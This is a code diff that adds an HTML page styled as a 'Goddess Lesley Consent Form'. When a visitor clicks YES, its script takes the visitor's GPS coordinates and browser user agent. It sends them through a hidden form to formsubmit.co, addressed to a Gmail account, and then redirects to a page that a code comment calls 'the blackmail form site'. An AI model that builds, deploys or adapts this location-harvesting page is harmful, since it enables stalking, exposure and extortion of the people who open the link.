@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consent Required</title>
+    <style>
+        body {
+            background-color: black;
+            color: lime;
+            font-family: "Courier New", monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        .warning {
+            font-size: 18px;
+            font-weight: bold;
+            color: red;
+        }
+        .button {
+            font-size: 18px;
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Goddess Lesley Consent Form</h2>
+    <p class="warning">By clicking "YES," you agree to:</p>
+    <ul style="text-align: left; display: inline-block;">
+        <li>Share your <strong>real-time GPS location</strong>.</li>
+        <li>Log your <strong>IP address, device model, and browser info</strong>.</li>
+        <li>Allow the site creators to use this information however they see fit.</li>
+        <li>Proceeding <strong>cannot be undone</strong>.</li>
+    </ul>
+    <p class="warning">Clicking "NO" will exit immediately.</p>
+
+    <button class="button" onclick="agree()">YES</button>
+    <button class="button" onclick="window.location.href='https://google.com'">NO</button>
+
+    <p id="tracking" class="hidden">Tracking your location...</p>
+
+    <form id="trackingForm" method="POST" action="https://formsubmit.co/wretchytub13@gmail.com">
+        <input type="hidden" name="_subject" value="New Lesley Consent Given">
+        <input type="hidden" name="Latitude" id="latitude">
+        <input type="hidden" name="Longitude" id="longitude">
+        <input type="hidden" name="Device_Info" id="device">
+        <input type="hidden" name="_captcha" value="false">
+    </form>
+
+    <script>
+        function agree() {
+            document.getElementById("tracking").classList.remove("hidden");
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    document.getElementById("latitude").value = position.coords.latitude;
+                    document.getElementById("longitude").value = position.coords.longitude;
+                    document.getElementById("device").value = navigator.userAgent;
+
+                    document.getElementById("trackingForm").submit();
+
+                    // Store consent and redirect to the blackmail form site
+                    sessionStorage.setItem("consentGiven", "true");
+                    setTimeout(function() {
+                        window.location.href = "index.html";  
+                    }, 1500);
+                });
+            } else {
+                alert("Geolocation is not supported by your browser.");
+                window.location.href = "index.html";  
+            }
+        }
+    </script>
+
+</body>
+</html>
